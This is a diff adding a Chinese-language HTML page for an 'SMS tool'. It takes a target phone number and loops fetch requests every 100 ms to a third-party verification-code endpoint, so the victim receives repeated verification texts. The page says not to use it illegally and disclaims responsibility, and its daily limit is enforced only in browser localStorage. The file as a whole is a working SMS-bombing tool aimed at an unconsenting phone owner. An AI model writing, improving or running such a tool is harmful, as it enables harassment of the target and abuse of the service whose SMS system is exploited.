@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>短信工具</title>
+    <!-- MDUI CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@1.0.2/dist/css/mdui.min.css">
+    <style>
+        .log-area {
+            height: 200px;
+            overflow-y: auto;
+            background: #1a1a1a;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 15px;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        
+        .log-area br {
+            display: block;
+            content: "";
+            margin: 5px 0;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body class="mdui-theme-primary-indigo mdui-theme-accent-pink">
+    <div class="mdui-container container">
+        <div class="mdui-typo-display-1 mdui-text-center mdui-m-b-4">短信工具</div>
+        
+        <div class="mdui-textfield">
+            <input class="mdui-textfield-input" type="tel" placeholder="请输入手机号码" maxlength="11" id="phoneInput"/>
+        </div>
+        
+        <button class="mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent mdui-btn-block" id="confirmBtn">
+            <i class="mdui-icon material-icons">send</i> 开始发送
+        </button>
+        
+        <button class="mdui-btn mdui-btn-raised mdui-ripple mdui-color-red mdui-btn-block" id="stopBtn" style="display:none;">
+            <i class="mdui-icon material-icons">stop</i> 停止发送
+        </button>
+        
+        <div class="mdui-panel" mdui-panel>
+            <div class="mdui-panel-item">
+                <div class="mdui-panel-item-header">
+                    <div class="mdui-panel-item-title">状态</div>
+                    <div class="mdui-panel-item-summary" id="statusText">等待开始</div>
+                    <i class="mdui-panel-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
+                </div>
+                <div class="mdui-panel-item-body">
+                    <div class="log-area" id="logArea">
+                        > 系统就绪<br>
+                        > 请输入手机号并点击开始
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="mdui-typo-caption-opacity mdui-m-t-2">
+            请勿用于非法用途，出事不管<br>
+            每日上限: <span id="dailyLimit">0</span>/10
+        </div>
+    </div>
+
+    <!-- MDUI JS -->
+    <script src="https://cdn.jsdelivr.net/npm/mdui@1.0.2/dist/js/mdui.min.js"></script>
+    <script>
+        class SmsTool {
+            constructor() {
+                this.isRunning = false;
+                this.count = 0;
+                this.dailyCount = localStorage.getItem('dailyCount') || 0;
+                this.phoneInput = document.getElementById('phoneInput');
+                this.confirmBtn = document.getElementById('confirmBtn');
+                this.stopBtn = document.getElementById('stopBtn');
+                this.statusText = document.getElementById('statusText');
+                this.logArea = document.getElementById('logArea');
+                this.dailyLimit = document.getElementById('dailyLimit');
+                
+                this.updateDailyLimit();
+                this.initEvents();
+            }
+            
+            initEvents() {
+                this.confirmBtn.addEventListener('click', () => this.start());
+                this.stopBtn.addEventListener('click', () => this.stop());
+                
+                this.phoneInput.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') {
+                        this.start();
+                    }
+                });
+            }
+            
+            updateDailyLimit() {
+                this.dailyLimit.textContent = this.dailyCount;
+            }
+            
+            async start() {
+                const phone = this.phoneInput.value.trim();
+                
+                if (!phone || phone.length !== 11) {
+                    this.addLog('错误：请输入正确的11位手机号码');
+                    mdui.snackbar({
+                        message: '请输入正确的11位手机号码',
+                        position: 'right-top'
+                    });
+                    return;
+                }
+                
+                if (this.dailyCount >= 10) {
+                    this.addLog('错误：今日已达到发送上限');
+                    mdui.snackbar({
+                        message: '今日已达到发送上限',
+                        position: 'right-top'
+                    });
+                    return;
+                }
+                
+                this.isRunning = true;
+                this.count = 0;
+                this.confirmBtn.style.display = 'none';
+                this.stopBtn.style.display = 'block';
+                this.statusText.textContent = '运行中...';
+                
+                this.addLog(`开始向 ${phone} 发送请求`);
+                
+                await this.loopRequests(phone);
+            }
+            
+            stop() {
+                this.isRunning = false;
+                this.confirmBtn.style.display = 'block';
+                this.stopBtn.style.display = 'none';
+                this.statusText.textContent = '已停止';
+                this.addLog(`已停止 - 总共发送: ${this.count} 次`);
+            }
+            
+            async loopRequests(phone) {
+                while (this.isRunning && this.dailyCount < 10) {
+                    try {
+                        const timestamp = Date.now();
+                        const randomNum = Math.floor(Math.random() * 9000) + 1000;
+                        const url = `http://ic.service.unipus.cn/cert/vcode?phone=${phone}&districtNumber=86&_t=${timestamp}&r=${randomNum}`;
+                        
+                        const response = await fetch(url, {
+                            method: 'GET',
+                            mode: 'no-cors',
+                            cache: 'no-cache'
+                        });
+                        
+                        this.count++;
+                        this.dailyCount++;
+                        localStorage.setItem('dailyCount', this.dailyCount);
+                        this.updateDailyLimit();
+                        
+                        this.addLog(`成功 ${this.count}`);
+                        this.statusText.textContent = `运行中... 成功: ${this.count}`;
+                        
+                        if (this.dailyCount >= 10) {
+                            this.stop();
+                            this.addLog('今日已达到发送上限');
+                            mdui.snackbar({
+                                message: '今日已达到发送上限',
+                                position: 'right-top'
+                            });
+                            break;
+                        }
+                        
+                    } catch (error) {
+                        this.addLog(`失败 ${error.message}`);
+                    }
+                    
+                    await this.delay(100);
+                }
+            }
+            
+            delay(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+            
+            addLog(message) {
+                const timestamp = new Date().toLocaleTimeString();
+                this.logArea.innerHTML += `[${timestamp}] ${message}<br>`;
+                this.logArea.scrollTop = this.logArea.scrollHeight;
+                
+                const lines = this.logArea.innerHTML.split('<br>');
+                if (lines.length > 99) {
+                    this.logArea.innerHTML = lines.slice(-30).join('<br>');
+                }
+            }
+        }
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            new SmsTool();
+        });
+    </script>
+</body>
+</html>
